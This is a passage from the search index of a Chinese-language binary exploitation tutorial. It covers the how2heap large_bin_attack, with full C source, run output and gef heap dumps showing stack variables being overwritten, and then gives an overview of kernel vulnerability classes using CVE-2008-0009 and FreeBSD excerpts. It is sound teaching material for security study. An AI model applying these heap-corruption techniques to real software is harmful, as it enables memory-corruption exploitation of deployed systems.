_IO_flush_all_lockp \u4e2d\u7684 _IO_OVERFLOW \u51fd\u6570\uff0c\u83b7\u5f97 shell\u3002 for (;; ) { int iters = 0; while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av)) { bck = victim->bk; if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0) || __builtin_expect (victim->size > av->system_mem, 0)) malloc_printerr (check_action, \"malloc(): memory corruption\", chunk2mem (victim), av); size = chunksize (victim); \u5230\u6b64\uff0chow2heap \u91cc\u5168\u90e8\u7684\u5806\u5229\u7528\u65b9\u6cd5\u5c31\u5168\u90e8\u8bb2\u5b8c\u4e86\u3002","title":"house_of_orange"},{"location":"Tutorial/Material/Binary%20Exploitation/#319-linux","text":"how2heap large_bin_attack house_of_rabbit house_of_roman \u53c2\u8003\u8d44\u6599 \u4e0b\u8f7d\u6587\u4ef6","title":"3.1.9 Linux \u5806\u5229\u7528\uff08\u56db\uff09"},{"location":"Tutorial/Material/Binary%20Exploitation/#how2heap_3","text":"","title":"how2heap"},{"location":"Tutorial/Material/Binary%20Exploitation/#large_bin_attack","text":"#include<stdio.h> #include<stdlib.h> int main() { unsigned long stack_var1 = 0; unsigned long stack_var2 = 0; fprintf(stderr, \"The targets we want to rewrite on stack:\\n\"); fprintf(stderr, \"stack_var1 (%p): %ld\\n\", &stack_var1, stack_var1); fprintf(stderr, \"stack_var2 (%p): %ld\\n\\n\", &stack_var2, stack_var2); unsigned long *p1 = malloc(0x100); fprintf(stderr, \"Now, we allocate the first chunk: %p\\n\", p1 - 2); malloc(0x10); unsigned long *p2 = malloc(0x400); fprintf(stderr, \"Then, we allocate the second chunk(large chunk): %p\\n\", p2 - 2); malloc(0x10); unsigned long *p3 = malloc(0x400); fprintf(stderr, \"Finally, we allocate the third chunk(large chunk): %p\\n\\n\", p3 - 2); malloc(0x10); // deal with tcache - libc-2.26 // int *a[10], *b[10], i; // for (i = 0; i < 7; i++) { // a[i] = malloc(0x100); // b[i] = malloc(0x400); // } // for (i = 0; i < 7; i++) { // free(a[i]); // free(b[i]); // } free(p1); free(p2); fprintf(stderr, \"Now, We free the first and the second chunks now and they will be inserted in the unsorted bin\\n\"); malloc(0x30); fprintf(stderr, \"Then, we allocate a chunk and the freed second chunk will be moved into large bin freelist\\n\\n\"); p2[-1] = 0x3f1; p2[0] = 0; p2[2] = 0; p2[1] = (unsigned long)(&stack_var1 - 2); p2[3] = (unsigned long)(&stack_var2 - 4); fprintf(stderr, \"Now we use a vulnerability to overwrite the freed second chunk\\n\\n\"); free(p3); malloc(0x30); fprintf(stderr, \"Finally, we free the third chunk and malloc again, targets should have already been rewritten:\\n\"); fprintf(stderr, \"stack_var1 (%p): %p\\n\", &stack_var1, (void *)stack_var1); fprintf(stderr, \"stack_var2 (%p): %p\\n\", &stack_var2, (void *)stack_var2); } $ gcc -g large_bin_attack.c $ ./a.out The targets we want to rewrite on stack: stack_var1 (0x7fffffffdeb0): 0 stack_var2 (0x7fffffffdeb8): 0 Now, we allocate the first chunk: 0x555555757000 Then, we allocate the second chunk(large chunk): 0x555555757130 Finally, we allocate the third chunk(large chunk): 0x555555757560 Now, We free the first and the second chunks now and they will be inserted in the unsorted bin Then, we allocate a chunk and the freed second chunk will be moved into large bin freelist Now we use a vulnerability to overwrite the freed second chunk Finally, we free the third chunk and malloc again, targets should have already been rewritten: stack_var1 (0x7fffffffdeb0): 0x555555757560 stack_var2 (0x7fffffffdeb8): 0x555555757560 \u8be5\u6280\u672f\u53ef\u7528\u4e8e\u4fee\u6539\u4efb\u610f\u5730\u5740\u7684\u503c\uff0c\u4f8b\u5982\u6808\u4e0a\u7684\u53d8\u91cf stack_var1 \u548c stack_var2\u3002\u5728\u5b9e\u8df5\u4e2d\u5e38\u5e38\u4f5c\u4e3a\u5176\u4ed6\u6f0f\u6d1e\u5229\u7528\u7684\u524d\u594f\uff0c\u4f8b\u5982\u5728 fastbin attack \u4e2d\u7528\u4e8e\u4fee\u6539\u5168\u5c40\u53d8\u91cf global_max_fast \u4e3a\u4e00\u4e2a\u5f88\u5927\u7684\u503c\u3002 \u9996\u5148\u6211\u4eec\u5206\u914d chunk p1, p2 \u548c p3\uff0c\u5e76\u4e14\u5728\u5b83\u4eec\u4e4b\u95f4\u63d2\u5165\u5176\u4ed6\u7684 chunk \u4ee5\u9632\u6b62\u5728\u91ca\u653e\u65f6\u88ab\u5408\u5e76\u3002\u6b64\u65f6\u7684\u5185\u5b58\u5e03\u5c40\u5982\u4e0b\uff1a gef\u27a4 x/2gx &stack_var1 0x7fffffffde70: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/4gx p1-2 0x555555757000: 0x0000000000000000 0x0000000000000111 <-- p1 0x555555757010: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/8gx p2-6 0x555555757110: 0x0000000000000000 0x0000000000000021 0x555555757120: 0x0000000000000000 0x0000000000000000 0x555555757130: 0x0000000000000000 0x0000000000000411 <-- p2 0x555555757140: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/8gx p3-6 0x555555757540: 0x0000000000000000 0x0000000000000021 0x555555757550: 0x0000000000000000 0x0000000000000000 0x555555757560: 0x0000000000000000 0x0000000000000411 <-- p3 0x555555757570: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/8gx p3+(0x410/8)-2 0x555555757970: 0x0000000000000000 0x0000000000000021 0x555555757980: 0x0000000000000000 0x0000000000000000 0x555555757990: 0x0000000000000000 0x0000000000020671 <-- top 0x5555557579a0: 0x0000000000000000 0x0000000000000000 \u7136\u540e\u4f9d\u6b21\u91ca\u653e\u6389 p1 \u548c p2\uff0c\u8fd9\u4e24\u4e2a free chunk \u5c06\u88ab\u653e\u5165 unsorted bin\uff1a gef\u27a4 x/8gx p1-2 0x555555757000: 0x0000000000000000 0x0000000000000111 <-- p1 [be freed] 0x555555757010: 0x00007ffff7dd3b78 0x0000555555757130 0x555555757020: 0x0000000000000000 0x0000000000000000 0x555555757030: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/8gx p2-2 0x555555757130: 0x0000000000000000 0x0000000000000411 <-- p2 [be freed] 0x555555757140: 0x0000555555757000 0x00007ffff7dd3b78 0x555555757150: 0x0000000000000000 0x0000000000000000 0x555555757160: 0x0000000000000000 0x0000000000000000 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x555555757130, bk=0x555555757000 \u2192 Chunk(addr=0x555555757140, size=0x410, flags=PREV_INUSE) \u2192 Chunk(addr=0x555555757010, size=0x110, flags=PREV_INUSE) [+] Found 2 chunks in unsorted bin. \u63a5\u4e0b\u6765\u968f\u4fbf malloc \u4e00\u4e2a chunk\uff0c\u5219 p1 \u88ab\u5207\u5206\u4e3a\u4e24\u5757\uff0c\u4e00\u5757\u4f5c\u4e3a\u5206\u914d\u7684 chunk \u8fd4\u56de\uff0c\u5269\u4e0b\u7684\u4e00\u5757\u7ee7\u7eed\u7559\u5728 unsorted bin\uff08p1 \u7684\u4f5c\u7528\u5c31\u5728\u8fd9\u91cc\uff0c\u5982\u679c\u6ca1\u6709 p1\uff0c\u90a3\u4e48\u5207\u5206\u7684\u5c06\u662f p2\uff09\u3002\u800c p2 \u5219\u88ab\u6574\u7406\u56de\u5bf9\u5e94\u7684 large bin \u94fe\u8868\b\u4e2d\uff1a gef\u27a4 x/14gx p1-2 0x555555757000: 0x0000000000000000 0x0000000000000041 <-- p1-1 0x555555757010: 0x00007ffff7dd3c78 0x00007ffff7dd3c78 0x555555757020: 0x0000000000000000 0x0000000000000000 0x555555757030: 0x0000000000000000 0x0000000000000000 0x555555757040: 0x0000000000000000 0x00000000000000d1 <-- p1-2 [be freed] 0x555555757050: 0x00007ffff7dd3b78 0x00007ffff7dd3b78 <-- fd, bk 0x555555757060: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/8gx p2-2 0x555555757130: 0x0000000000000000 0x0000000000000411 <-- p2 [be freed] 0x555555757140: 0x00007ffff7dd3f68 0x00007ffff7dd3f68 <-- fd, bk 0x555555757150: 0x0000555555757130 0x0000555555757130 <-- fd_nextsize, bk_nextsize 0x555555757160: 0x0000000000000000 0x0000000000000000 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x555555757040, bk=0x555555757040 \u2192 Chunk(addr=0x555555757050, size=0xd0, flags=PREV_INUSE) [+] Found 1 chunks in unsorted bin. gef\u27a4 heap bins large [ Large Bins for arena 'main_arena' ] [+] large_bins[63]: fw=0x555555757130, bk=0x555555757130 \u2192 Chunk(addr=0x555555757140, size=0x410, flags=PREV_INUSE) [+] Found 1 chunks in 1 large non-empty bins. \u6574\u7406\u7684\u8fc7\u7a0b\u5982\u4e0b\u6240\u793a\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f large bins \u4e2d chunk \u6309 fd \u6307\u9488\u7684\u987a\u5e8f\u4ece\u5927\u5230\u5c0f\u6392\u5217\uff0c\u5982\u679c\u5927\u5c0f\u76f8\u540c\u5219\u6309\u7167\u6700\u8fd1\u4f7f\u7528\u987a\u5e8f\u6392\u5217\uff1a /* place chunk in bin */ if (in_smallbin_range (size)) { [ ... ] } else { victim_index = largebin_index (size); bck = bin_at (av, victim_index); fwd = bck->fd; /* maintain large bins in sorted order */ if (fwd != bck) { /* Or with inuse bit to speed comparisons */ size |= PREV_INUSE; /* if smaller than smallest, bypass loop below */ assert ((bck->bk->size & NON_MAIN_ARENA) == 0); if ((unsigned long) (size) < (unsigned long) (bck->bk->size)) { [ ... ] } else { assert ((fwd->size & NON_MAIN_ARENA) == 0); while ((unsigned long) size < fwd->size) { [ ... ] } if ((unsigned long) size == (unsigned long) fwd->size) [ ... ] else { victim->fd_nextsize = fwd; victim->bk_nextsize = fwd->bk_nextsize; fwd->bk_nextsize = victim; victim->bk_nextsize->fd_nextsize = victim; } bck = fwd->bk; } } else [ ... ] } mark_bin (av, victim_index); victim->bk = bck; victim->fd = fwd; fwd->bk = victim; bck->fd = victim; \u5047\u8bbe\u6211\u4eec\u6709\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u5bf9 large bin \u91cc\u7684 chunk p2 \u8fdb\u884c\u4fee\u6539\uff0c\u7ed3\u5408\u4e0a\u9762\u7684\u6574\u7406\u8fc7\u7a0b\uff0c\u6211\u4eec\u4f2a\u9020 p2 \u5982\u4e0b\uff1a gef\u27a4 x/8gx p2-2 0x555555757130: 0x0000000000000000 0x00000000000003f1 <-- fake p2 [be freed] 0x555555757140: 0x0000000000000000 0x00007fffffffde60 <-- bk 0x555555757150: 0x0000000000000000 0x00007fffffffde58 <-- bk_nextsize 0x555555757160: 0x0000000000000000 0x0000000000000000 \u540c\u6837\u7684\uff0c\u91ca\u653e p3\uff0c\u5c06\u5176\u653e\u5165 unsorted bin\uff0c\u7d27\u63a5\u7740\u8fdb\u884c malloc \u64cd\u4f5c\uff0c\u5c06 p3 \u6574\u7406\u56de large bin\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u5224\u65ad\u6761\u4ef6 (unsigned long) (size) < (unsigned long) (bck->bk->size) \u4e3a\u5047\uff0c\u7a0b\u5e8f\u5c06\u8fdb\u5165 else \u5206\u652f\uff0c\u5176\u4e2d fwd \u662f fake p2\uff0c victim \u662f p3\uff0c\u63a5\u7740 bck \u88ab\u8d4b\u503c\u4e3a (&stack_var1 - 2)\u3002 \u5728 p3 \u88ab\u653e\u56de large bin \u5e76\u6392\u5e8f\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u4f4d\u4e8e\u6808\u4e0a\u7684\u4e24\u4e2a\u53d8\u91cf\u4e5f\u88ab\u4fee\u6539\u6210\u4e86 victim \uff0c\u5bf9\u5e94\u7684\u8bed\u53e5\u5206\u522b\u662f bck->fd = victim; \u548c ictim->bk_nextsize->fd_nextsize = victim; \u3002 gef\u27a4 x/2gx &stack_var1 0x7fffffffde70: 0x0000555555757560 0x0000555555757560 gef\u27a4 x/8gx p2-2 0x555555757130: 0x0000000000000000 0x00000000000003f1 0x555555757140: 0x0000000000000000 0x0000555555757560 0x555555757150: 0x0000000000000000 0x0000555555757560 0x555555757160: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/8gx p3-2 0x555555757560: 0x0000000000000000 0x0000000000000411 0x555555757570: 0x0000555555757130 0x00007fffffffde60 0x555555757580: 0x0000555555757130 0x00007fffffffde58 0x555555757590: 0x0000000000000000 0x0000000000000000 \u8003\u8651 libc-2.26 \u4e0a\u7684\u60c5\u51b5\uff0c\u8fd8\u662f\u4e00\u6837\u7684\uff0c\u5904\u7406\u597d tchache \u5c31\u53ef\u4ee5\u4e86\uff0c\u5728 free \u4e4b\u524d\u628a\u4e24\u79cd\u5927\u5c0f\u7684 tcache bin \u90fd\u5360\u6ee1\u3002","title":"large_bin_attack"},{"location":"Tutorial/Material/Binary%20Exploitation/#3111-linux","text":"\u4ece\u7528\u6237\u6001\u5230\u5185\u6838\u6001 \u5185\u6838\u6f0f\u6d1e\u5206\u7c7b \u5185\u6838\u5229\u7528\u65b9\u6cd5 \u53c2\u8003\u8d44\u6599","title":"3.1.11 Linux \u5185\u6838\u6f0f\u6d1e\u5229\u7528"},{"location":"Tutorial/Material/Binary%20Exploitation/#_25","text":"\u4f01\u56fe \u7528\u6237\u6001\u6f0f\u6d1e\u5229\u7528 \u5185\u6838\u6001\u6f0f\u6d1e\u5229\u7528 \u86ee\u529b\u6cd5\u5229\u7528\u6f0f\u6d1e \u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u591a\u6b21\u5d29\u6e83\u5e76\u91cd\u542f\uff08\u6216\u81ea\u52a8\u91cd\u542f\uff09 \u8fd9\u5c06\u5bfc\u81f4\u673a\u5668\u9677\u5165\u4e0d\u4e00\u81f4\u7684\u72b6\u6001\uff0c\u901a\u5e38\u4f1a\u5bfc\u81f4\u6b7b\u673a\u6216\u91cd\u542f \u5f71\u54cd\u76ee\u6807\u7a0b\u5e8f \u653b\u51fb\u8005\u5bf9\u88ab\u653b\u51fb\u7a0b\u5e8f\uff08\u7279\u522b\u662f\u672c\u5730\u653b\u51fb\uff09\u62e5\u6709\u66f4\u591a\u7684\u63a7\u5236\uff08\u4f8b\u5982\u653b\u51fb\u8005\u53ef\u4ee5\u8bbe\u7f6e\u88ab\u653b\u51fb\u7a0b\u5e8f\u7684\u8fd0\u884c\u73af\u5883\uff09\u3002\u88ab\u653b\u51fb\u7a0b\u5e8f\u662f\u5b83\u7684\u5e93\u5b50\u7cfb\u7edf\u7684\u552f\u4e00\u4f7f\u7528\u8005\uff08\u4f8b\u5982\u5185\u5b58\u5206\u914d\u8868\uff09 \u653b\u51fb\u8005\u9700\u8981\u548c\u5176\u4ed6\u6240\u6709\u6b32\u201c\u5f71\u54cd\u201d\u5185\u6838\u7684\u5e94\u7528\u7a0b\u5e8f\u7ade\u4e89\u3002\u6240\u6709\u7684\u5e94\u7528\u7a0b\u5e8f\u90fd\u662f\u5185\u6838\u5b50\u7cfb\u7edf\u7684\u4f7f\u7528\u8005 \u6267\u884c shellcode shellcode \u53ef\u4ee5\u5229\u7528\u5df2\u7ecf\u901a\u8fc7\u5b89\u5168\u548c\u6b63\u786e\u6027\u4fdd\u8bc1\u7684\u7528\u6237\u6001\u95e8\u6765\u8fdb\u884c\u5185\u6838\u7cfb\u7edf\u8c03\u7528 shellcode \u5728\u66f4\u9ad8\u7684\u6743\u9650\u7ea7\u522b\u4e0a\u6267\u884c\uff0c\u5e76\u4e14\u5fc5\u987b\u5728\u4e0d\u60ca\u52a8\u7cfb\u7edf\u7684\u60c5\u51b5\u4e0b\u6b63\u786e\u5730\u8fd4\u56de\u5230\u5e94\u7528\u7a0b\u5e8f \u7ed5\u8fc7\u53cd\u6f0f\u6d1e\u5229\u7528\u4fdd\u62a4\u63aa\u65bd \u8fd9\u8981\u6c42\u8d8a\u6765\u8d8a\u590d\u6742\u7684\u65b9\u6cd5 \u5927\u90e8\u5206\u4fdd\u62a4\u63aa\u65bd\u5728\u5185\u6838\u6001\uff0c\u4f46\u5e76\u4e0d\u80fd\u4fdd\u62a4\u5185\u6838\u672c\u8eab\u3002\u653b\u51fb\u8005\u751a\u81f3\u80fd\u7981\u7528\u5927\u90e8\u5206\u4fdd\u62a4\u63aa\u65bd","title":"\u4ece\u7528\u6237\u6001\u5230\u5185\u6838\u6001"},{"location":"Tutorial/Material/Binary%20Exploitation/#_26","text":"","title":"\u5185\u6838\u6f0f\u6d1e\u5206\u7c7b"},{"location":"Tutorial/Material/Binary%20Exploitation/#_27","text":"\u8fd9\u7c7b\u6f0f\u6d1e\u6db5\u76d6\u4e86\u6240\u6709\u4f7f\u7528\u6307\u9488\u7684\u60c5\u51b5\uff0c\u6240\u6307\u5185\u5bb9\u906d\u5230\u7834\u574f\u3001\u6ca1\u6709\u88ab\u6b63\u786e\u8bbe\u7f6e\u3001\u6216\u8005\u662f\u6ca1\u6709\u505a\u8db3\u591f\u7684\u9a8c\u8bc1\u3002 \u6211\u4eec\u77e5\u9053\u4e00\u4e2a\u9759\u6001\u58f0\u660e\u7684\u6307\u9488\u88ab\u521d\u59cb\u5316\u4e3a NULL\uff0c\u4f46\u5176\u4ed6\u60c5\u51b5\u4e0b\u8fd9\u4e9b\u6307\u9488\u88ab\u660e\u786e\u5730\u8d4b\u503c\u4e4b\u524d\uff0c\u90fd\u662f\u672a\u521d\u59cb\u5316\u7684\uff0c\u5b83\u7684\u503c\u662f\u5b58\u653e\u6307\u9488\u5904\u7684\u5185\u5b58\u91cc\u7684\u4efb\u610f\u5185\u5bb9\u3002\u4f8b\u5982\u4e0b\u9762\u8fd9\u6837\uff0c\u6307\u9488\u88ab\u5b58\u653e\u5728\u6808\u4e0a\uff0c\u800c\u5b83\u7684\u5185\u5bb9\u662f\u4e4b\u524d\u51fd\u6570\u7559\u5728\u6808\u4e0a\u7684 \"A\" \u5b57\u7b26\u4e32\uff1a #include <stdio.h> #include <string.h> void big_stack_usage() { char big[0x100]; memset(big, 'A', 0x100); printf(\"Big stack: %p ~ %p\\n\", big, big+0x100); } void ptr_un_initialized() { char *p; printf(\"Pointer value: %p => %p\\n\", &p, p); } int main() { big_stack_usage(); ptr_un_initialized(); } $ gcc -fno-stack-protector pointer.c $ ./a.out Big stack: 0x7fffd6b0e400 ~ 0x7fffd6b0e500 Pointer value: 0x7fffd6b0e4f8 => 0x4141414141414141 \u4e0b\u9762\u770b\u4e00\u4e2a\u771f\u5b9e\u7684\u4f8b\u5b50\uff0c\u6765\u81ea FreeBSD8.0\uff1a struct ucred ucred, *ucp; // [1] [...] refcount_init(&ucred.cr_ref, 1); ucred.cr_uid = ip->i_uid; ucred.cr_ngroups = 1; ucred.cr_groups[0] = dp->i_gid; // [2] ucp = &ucred; [1] \u5904\u7684 ucred \u5728\u6808\u4e0a\u8fdb\u884c\u4e86\u58f0\u660e\uff0c\u7136\u540e cr_groups[0] \u88ab\u8d4b\u503c\u4e3a dp->i_gid \u3002\u9057\u61be\u7684\u662f\uff0c struct ucred \u7ed3\u6784\u4f53\u7684\u5b9a\u4e49\u662f\u8fd9\u6837\u7684\uff1a struct ucred { u_int cr_ref; /* reference count */ [...] gid_t *cr_groups; /* groups */ int cr_agroups; /* Available groups */ }; \u6211\u4eec\u770b\u5230 cr_groups \u662f\u4e00\u4e2a\u6307\u9488\uff0c\u800c\u4e14\u6ca1\u6709\u88ab\u521d\u59cb\u5316\u5c31\u76f4\u63a5\u4f7f\u7528\u3002\u8fd9\u4e5f\u5c31\u610f\u5473\u7740\uff0c dp->i_gid \u7684\u503c\u5728 ucred \u88ab\u5206\u914d\u65f6\u88ab\u5199\u5165\u5230\u6808\u4e0a\u7684\u4efb\u610f\u5730\u5740\u3002 \u7ee7\u7eed\u770b\u672a\u7ecf\u9a8c\u8bc1\u7684\u6307\u9488\uff0c\u8fd9\u5f80\u5f80\u53d1\u751f\u5728\u591a\u7528\u6237\u7684\u5185\u6838\u5730\u5740\u7a7a\u95f4\u4e2d\u3002\u6211\u4eec\u77e5\u9053\u5185\u6838\u7a7a\u95f4\u4f4d\u4e8e\u7528\u6237\u7a7a\u95f4\u7684\u4e0a\u9762\uff0c\u5b83\u7684\u9875\u8868\u5728\u6240\u6709\u8fdb\u7a0b\u7684\u9875\u8868\u4e2d\u90fd\u6709\u5907\u4efd\u3002\u6709\u4e9b\u865a\u62df\u5730\u5740\u88ab\u9009\u505a\u9650\u5236\u5730\u5740\uff0c\u9650\u5b9a\u5730\u5740\u4ee5\u4e0a\u6216\u4ee5\u4e0b\u7684\u865a\u62df\u5730\u5740\u5f52\u5185\u6838\u4f7f\u7528\uff0c\u800c\u5176\u4ed6\u7684\u5f52\u7528\u6237\u7a7a\u95f4\u4f7f\u7528\u3002\u5185\u6838\u51fd\u6570\u4e5f\u5c31\u662f\u4f7f\u7528\u8fd9\u4e2a\u9650\u5b9a\u5730\u5740\u6765\u5224\u65ad\u4e00\u4e2a\u6307\u9488\u6307\u5411\u7684\u662f\u5185\u6838\u8fd8\u662f\u7528\u6237\u7a7a\u95f4\u3002\u5982\u679c\u662f\u524d\u8005\uff0c\u5219\u53ef\u80fd\u53ea\u9700\u505a\u5c11\u91cf\u7684\u9a8c\u8bc1\uff0c\u4f46\u5982\u679c\u662f\u540e\u8005\uff0c\u5219\u8981\u683c\u5916\u5c0f\u5fc3\uff0c\u5426\u5219\u4e00\u4e2a\u7528\u6237\u7a7a\u95f4\u7684\u5730\u5740\u53ef\u80fd\u5728\u4e0d\u53d7\u63a7\u5236\u7684\u60c5\u51b5\u4e0b\u88ab\u89e3\u5f15\u7528\u3002 \u770b\u4e00\u4e2a Linux \u7684\u4f8b\u5b50\uff0cCVE-2008-0009\uff1a error = get_user(base, &iov->iov_base); // [1] [...] if (unlikely(!base)) { error = -EFAULT; break; } [...] sd.u.userptr = base; // [2] [...] size = __splice_from_pipe(pipe, &sd, pipe_to_user); [...] static int pipe_to_user(struct pipe_inode_info *pipe, struct pipe_buffer *buf, struct splice_desc *sd) { if (!fault_in_pages_writeable(sd->u.userptr, sd->len)) { src = buf->ops->map(pipe, buf, 1); ret = __copy_to_user_inatomic(sd->u.userptr, src + buf->offset, sd->len); // [3] buf->ops->unmap(pipe, buf, src); [...] } \u4ee3\u7801\u7684\u7b2c\u4e00\u90e8\u5206\u6765\u81ea\u51fd\u6570 vmsplice_to_user() \uff0c\u5728 [1] \u5904\u4f7f\u7528\u4e86 get_user() \u83b7\u5f97\u4e86\u76ee\u7684\u6307\u9488\u3002\u8be5\u76ee\u7684\u6307\u9488\u672a\u7ecf\u68c0\u67e5\u5c31\u9ed8\u8ba4\u5b83\u662f\u4e00\u4e2a\u7528\u6237\u5730\u5740\u6307\u9488\uff0c\u7136\u540e\u901a\u8fc7 [2] \u4f20\u9012\u7ed9\u4e86 __splice_from_pipe() \uff0c\u540c\u65f6\u4f20\u9012\u51fd\u6570 pipe_to_user \u4f5c\u4e3a helper function\u3002\u8fd9\u4e2a\u51fd\u6570\u4f9d\u7136\u662f\u672a\u7ecf\u68c0\u67e5\u5c31\u8c03\u7528\u4e86 __copy_to_user_inatomic() [3]\uff0c\u5bf9\u8be5\u6307\u9488\u505a\u89e3\u5f15\u7528\u7684\u64cd\u4f5c\uff0c\u5982\u679c\u653b\u51fb\u8005\u4f20\u9012\u7684\u662f\u4e00\u4e2a\u5185\u6838\u5730\u5740\uff0c\u5219\u5229\u7528\u8be5\u6f0f\u6d1e\u80fd\u591f\u5199\u5165\u4efb\u610f\u6570\u636e\u5230\u4efb\u610f\u7684\u5185\u6838\u5185\u5b58\u4e2d\u3002\u8fd9\u91cc\u8981\u77e5\u9053\u7684\u8fd8\u6709 Linux \u4e2d\u4ee5\u4e24\u4e2a\u4e0b\u5212\u7ebf\u5f00\u5934\u7684\u51fd\u6570\uff08\u4f8b\u5982 __copy_to_user_inatomic() \uff09\u662f\u4e0d\u4f1a\u5bf9\u6240\u63d0\u4f9b\u7684\u76ee\u7684\uff08\u6216\u6e90\uff09\u7528\u6237\u6307\u9488\u505a\u4efb\u4f55\u68c0\u67e5\u7684\u3002 \u6700\u540e\uff0c\u4e00\u4e2a\u88ab\u635f\u574f\u7684\u6307\u9488\u5f80\u5f80\u662f\u5176\u4ed6\u6f0f\u6d1e\u7684\u7ed3\u679c\uff08\u4f8b\u5982\u7f13\u51b2\u533a\u6ea2\u51fa\uff09\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4efb\u610f\u4fee\u6539\u6307\u9488\u7684\u5185\u5bb9\uff0c\u83b7\u5f97\u66f4\u591a\u7684\u63a7\u5236\u6743\u3002","title":"\u672a\u521d\u59cb\u5316\u7684\u3001\u672a\u9a8c\u8bc1\u7684\u3001\u5df2\u635f\u574f\u7684\u6307\u9488\u89e3\u5f15\u7528"},{"location":"Tutorial/Material/Binary%20Exploitation/#_28","text":"\u8fd9\u7c7b\u6f0f\u6d1e\u662f\u7531\u4e8e\u7a0b\u5e8f\u7684\u9519\u8bef\u64cd\u4f5c\u91cd\u5199\u4e86\u5185\u6838\u7a7a\u95f4\u7684\u5185\u5b58\uff08\u5305\u62ec\u5185\u6838\u6808\u548c\u5185\u6838\u5806\uff09\u5bfc\u81f4\u7684\u3002 \u5185\u6838\u6808\u5728\u6bcf\u6b21\u8fdb\u7a0b\u8fdb\u5165\u5230\u5185\u6838\u6001\u65f6\u53d1\u6325\u4f5c\u7528\u3002\u5185\u6838\u6808\u4e0e\u7528\u6237\u6808\u57fa\u672c\u76f8\u540c\uff0c\u4f46\u4e5f\u6709\u4e00\u4e9b\u7ec6\u5c0f\u7684\u5dee\u522b\uff0c\u4f8b\u5982\u5b83\u7684\u5927\u5c0f\u901a\u5e38\u662f\u53d7\u9650\u5236\u7684\u3002\u53e6\u5916\uff0c\u6240\u6709\u8fdb\u7a0b\u7684\u5185\u6838\u6808\u90fd\u662f\u4e00\u5757\u76f8\u540c\u7684\u5185\u6838\u5730\u5740\u7a7a\u95f4\u4e2d\u7684\u4e00\u90e8\u5206\uff0c\u6240\u4ee5\u4ed6\u4eec\u5f00\u59cb\u4e8e\u4e0d\u540c\u7684\u865a\u62df\u5730\u5740\u5e76\u4e14\u5360\u636e\u4e0d\u540c\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3002 \u7531\u4e8e\u5185\u6838\u6808\u4e0e\u7528\u6237\u6808\u7684\u76f8\u4f3c\u6027\uff0c\u5176\u53d1\u751f\u6f0f\u6d1e\u7684\u5730\u65b9\u4e5f\u5927\u4f53\u76f8\u540c\uff0c\u4f8b\u5982\u4f7f\u7528\u4e0d\u5b89\u5168\u7684\u51fd\u6570\uff08 strcpy() , sprintf() \u7b49\uff09\uff0c\u6570\u7ec4\u8d8a\u754c\uff0c\u7f13\u51b2\u533a\u6ea2\u51fa\u7b49\u3002 \u9488\u5bf9\u5185\u6838\u5806\u7684\u6f0f\u6d1e\u5f80\u5f80\u662f\u7f13\u51b2\u533a\u6ea2\u51fa\u9020\u6210\u7684\u3002\u901a\u8fc7\u6ea2\u51fa\uff0c\u91cd\u5199\u4e86\u6ea2\u51fa\u5757\u540e\u9762\u7684\u5757\uff0c\u6216\u8005\u91cd\u5199\u4e86\u7f13\u5b58\u76f8\u5173\u7684\u5143\u6570\u636e\uff0c\u90fd\u53ef\u80fd\u9020\u6210\u6f0f\u6d1e\u5229\u7528\u3002","title":"\u5185\u5b58\u7834\u574f\u6f0f\u6d1e"},{"location":"Tutorial/Material/Binary%20Exploitation/#_29","text":"\u6574\u6570\u6ea2\u51fa\u548c\u7b26\u53f7\u8f6c\u6362\u9519\u8bef\u662f\u6700\u5e38\u89c1\u7684\u4e24\u79cd\u6574\u6570\u8bef\u7528\u6f0f\u6d1e\u3002\u8fd9\u7c7b\u6f0f\u6d1e\u5f80\u5f80\u4e0d\u5bb9\u6613\u5355\u72ec\u5229\u7528\uff0c\u4f46\u5b83\u53ef\u80fd\u4f1a\u5bfc\u81f4\u53e6\u5916\u7684\u4e00\u4e9b\u6f0f\u6d1e\uff08\u4f8b\u5982\u5185\u5b58\u6ea2\u51fa\uff09\u7684\u53d1\u751f\u3002 \u6574\u6570\u6ea2\u51fa\u53d1\u751f\u5728\u5c06\u4e00\u4e2a\u8d85\u51fa\u6574\u6570\u6570\u636e\u5b58\u50a8\u8303\u56f4\u7684\u6570\u8d4b\u503c\u7ed9\u4e00\u4e2a\u6574\u6570\u53d8\u91cf\u3002\u5728\u4e0d\u52a0\u63a7\u5236\u7684\u52a0\u6cd5\u548c\u4e58\u6cd5\u8fd0\u7b97\u4e2d\u5982\u679c\u5806\u53c2\u89c1\u8fd0\u7b97\u7684\u53c2\u6570\u4e0d\u52a0\u9a8c\u8bc1\uff0c\u4e5f\u6709\u53ef\u80fd\u53d1\u751f\u6574\u6570\u6ea2\u51fa\u3002 \u7b26\u53f7\u8f6c\u6362\u9519\u8bef\u53d1\u751f\u5728\u5c06\u4e00\u4e2a\u65e0\u7b26\u53f7\u6570\u5f53\u505a\u6709\u7b26\u53f7\u6570\u5904\u7406\u7684\u65f6\u5019\u3002\u4e00\u4e2a\u7ecf\u5178\u7684\u573a\u666f\u662f\uff0c\u4e00\u4e2a\u6709\u7b26\u53f7\u6570\u7ecf\u8fc7\u67d0\u4e2a\u6700\u5927\u503c\u68c0\u6d4b\u540e\u4f20\u5165\u4e00\u4e2a\u51fd\u6570\uff0c\u800c\u8fd9\u4e2a\u51fd\u6570\u53ea\u63a5\u6536\u65e0\u7b26\u53f7\u6570\u3002 \u770b\u4e00\u4e2a FreeBSD V6.0 \u7684\u4f8b\u5b50\uff1a int fw_ioctl (struct cdev *dev, u_long cmd, 